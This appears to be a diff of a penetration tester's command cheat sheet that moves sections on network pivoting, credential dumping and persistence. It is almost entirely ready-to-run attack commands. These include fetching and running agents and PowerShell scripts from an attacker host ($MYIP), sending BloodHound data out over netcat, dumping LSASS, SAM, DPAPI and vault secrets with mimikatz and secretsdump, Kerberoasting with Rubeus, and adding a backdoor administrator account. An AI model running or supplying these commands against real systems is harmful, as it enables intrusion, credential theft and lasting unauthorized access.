@@ -1079,86 +1079,6 @@ impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 
-# Lateral Movement: Pivoting
-## Identify
-Linux:   route; arp -a; ifconfig
-Windows: route print; arp -a; ipconfig /all
-
-## Calculate Range
-ipcalc 172.16.1.0/255.255.255.0
-
-## Ligolo: Setup
-sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
-curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
-session 1
-interface_create --name ligolo
-tunnel_start --tun ligolo
-ifconfig
-interface_add_route --name ligolo --route 240.0.0.1/32
-interface_add_route --name ligolo --route 192.168.110.51/24
-
-## Ligolo: Reset
-stop,  interface_delete --name ligolo,  start
-
-## Single Host
-chromium 240.0.0.1:3000
-curl 240.0.0.1:5000
-
-## Identify Hosts
-nbtscan-unixwiz 192.168.110.51/24
-fping -ag 192.168.110.51/24
-sudo masscan -n -Pn '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --rate 500 --max-rate 500 -g53 --spoof-mac '6C:45:C4:52:68:5C' --data-length 0 -e 'ligolo' -S '240.0.0.1' | grep -oP "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u | tee hosts_IP__24
-sudo nmap -n -Pn -sS '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts; sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_IP__24
-
-## Port Scan: Default and Full
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_IP__24'
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IP__24'
-
-# Lateral Movement: Credential Dumping
-## Dump: DPAPI, LSASS, SAM + Secrets
-(t=$TARGET; u=dbf; p='123qweasdF!'; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
-
-## Upload Binaries
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
-
-## Command Execution: Winrm / Winexe
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
-rlwrap winexe --pw-nt-hash -U 'Administrator%5917507bdf2ef2c2b0a869a1cba40726' //$TARGET 'cmd.exe /c powershell'
-
-## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
-mkdir dpapi
-winexe -U 'dbf%123qweasdF!' //$TARGET "cmd.exe /c powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
-download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
-download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
-impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
-impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
-
-## Rubeus: Tickets
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
-C:\Windows\Tasks\Rubeus.exe monitor /interval:5 /nowrap
-C:\Windows\Tasks\Rubeus.exe dump /nowrap
-C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap
-C:\Windows\Tasks\Rubeus.exe asreproast /nowrap
-C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap
-
-## Mimikatz: Dumps+
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
-privilege::debug
-token::elevate
-sekurlsa::logonpasswords
-lsadump::secrets
-vault::list
-vault::cred /patch
-sekurlsa::dpapi
-
-# Persistence: Create Account
-## Create Account
-powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
-
 # Post-Exploitation 
 ## Linux
 [*] Initial Shell
@@ -1402,6 +1322,10 @@ curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
+[*] Persistence
++---------- Create Account ----------+
+powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
+
 [*] Privilege Escalation
 +---------- Priv Check ----------+
 powershell -c "curl $MYIP/windows/winPEASofs.exe -o \programdata\winPEASofs.exe; \programdata\winPEASofs.exe"
@@ -1409,9 +1333,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
-
-+---------- Check For Pivots ----------+
-arp -a
 
 +---------- Sharphound Data ----------+
 curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
@@ -1590,3 +1511,79 @@ sessions
 sessions -i 1
 jobs
 jobs -k 1
+
+# Lateral Movement: Pivoting
+## Identify
+Linux:   route; arp -a; ifconfig
+Windows: route print; arp -a; ipconfig /all
+
+## Calculate Range
+ipcalc 172.16.1.0/255.255.255.0
+
+## Ligolo: Setup
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
+curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
+session 1
+interface_create --name ligolo
+tunnel_start --tun ligolo
+ifconfig
+interface_add_route --name ligolo --route 240.0.0.1/32
+interface_add_route --name ligolo --route 192.168.110.51/24
+
+## Ligolo: Reset
+stop,  interface_delete --name ligolo,  start
+
+## Single Host
+chromium 240.0.0.1:3000
+curl 240.0.0.1:5000
+
+## Identify Hosts
+nbtscan-unixwiz 192.168.110.51/24
+fping -ag 192.168.110.51/24
+sudo masscan -n -Pn '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --rate 500 --max-rate 500 -g53 --spoof-mac '6C:45:C4:52:68:5C' --data-length 0 -e 'ligolo' -S '240.0.0.1' | grep -oP "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u | tee hosts_IP__24
+sudo nmap -n -Pn -sS '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts; sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_IP__24
+
+## Port Scan: Default and Full
+sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_IP__24'
+sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IP__24'
+
+# Lateral Movement: Credential Dumping
+## Dump: DPAPI, LSASS, SAM + Secrets
+(t=$TARGET; u=dbf; p='123qweasdF!'; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
+
+## Upload Binaries
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
+
+## Command Execution: Winrm / Winexe
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
+rlwrap winexe --pw-nt-hash -U 'Administrator%5917507bdf2ef2c2b0a869a1cba40726' //$TARGET 'cmd.exe /c powershell'
+
+## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
+mkdir dpapi
+winexe -U 'dbf%123qweasdF!' //$TARGET "cmd.exe /c powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
+download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
+impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
+impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
+
+## Rubeus: Tickets
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
+C:\Windows\Tasks\Rubeus.exe monitor /interval:5 /nowrap
+C:\Windows\Tasks\Rubeus.exe dump /nowrap
+C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap
+C:\Windows\Tasks\Rubeus.exe asreproast /nowrap
+C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap
+
+## Mimikatz: Dumps+
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::secrets
+vault::list
+vault::cred /patch
+sekurlsa::dpapi
